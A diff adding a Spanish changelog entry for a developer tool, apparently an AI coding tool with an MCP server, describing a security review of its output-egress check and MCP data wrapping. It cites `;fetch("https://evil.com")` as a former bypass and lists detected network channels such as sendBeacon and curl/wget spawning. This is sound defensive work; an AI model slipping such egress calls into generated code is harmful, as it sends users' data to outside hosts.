@@ -13,6 +13,12 @@ Formato: [Keep a Changelog](https://keepachangelog.com/es/1.0.0/).
 
 > **Nombre:** el producto pasa a llamarse **Fragua** (decisión del 2026-10-13). El paquete de npm es `fragua` y la orden principal es `fragua`; `forge` y `sdd-es` siguen funcionando, igual que las variables `FORGE_*` junto a `FRAGUA_*`. Nombres de comandos `sdd.*`, carpetas y skills no cambian. Ver `.sdd/especificaciones/2026-10-13-renombrar-a-fragua/`.
 
+### Revisión independiente nº 1 de la defensa: control de salida y MCP (2026-10-17)
+
+- **Seguridad.** El control de salida decide qué es un comentario **por lenguaje** (antes cualquier línea que empezara por `;`, `%`, `--` o `*` se saltaba, y `;fetch("https://evil.com")` pasaba); mira más vías de red (`sendBeacon`, `new Image().src`, `exec`/`spawn` de `curl`/`wget`, `import("https://…")`, `url(…)`, SVG) y trata `.html` como código; y un host que sólo estaba en un comentario del archivo anterior ya no queda pre-autorizado (H-2, H-3, H-4).
+- **Cambio visible.** `leer_archivo` y `ejecutar_pruebas` (servidor MCP) devuelven el texto del proyecto dentro de un bloque `<<<forge-dato:…>>>`, y `leer_archivo` redacta los formatos de secreto conocidos (H-5). El perfil `verificacion` no cambia.
+- **Corregido.** Un `proyecto.lock` plantado por el repositorio ya no deja el servidor «ocupado», un «ocupado» no gasta cupo y el contador de cupos tiene candado propio (H-7, H-8). Pendientes: H-9 (`COM¹`), H-10 y H-11; el secreto partido o codificado queda documentado como límite (H-6).
+
 ### Proveedores agnósticos: precios, caché y kit de pruebas (spec `2026-10-13-proveedores-agnosticos`, 2026-10-17)
 
 - **Precios de OpenAI.** La tabla incluida pasa de 2 a 16 modelos (`gpt-4o`, `gpt-4.1`, `gpt-5.4`, `gpt-5.5`, `gpt-5.6-*`, `gpt-6*`), copiados de https://developers.openai.com/api/docs/pricing el 2026-10-17 (nivel Standard, hasta 272K de entrada; por encima hay tarifa mayor que no se contempla). Quedan fuera los modelos «-pro», `o1`/`o3` y los que no se confirmó que sirvan por la API de chat. Un modelo ausente sigue contándose al precio más caro conocido.
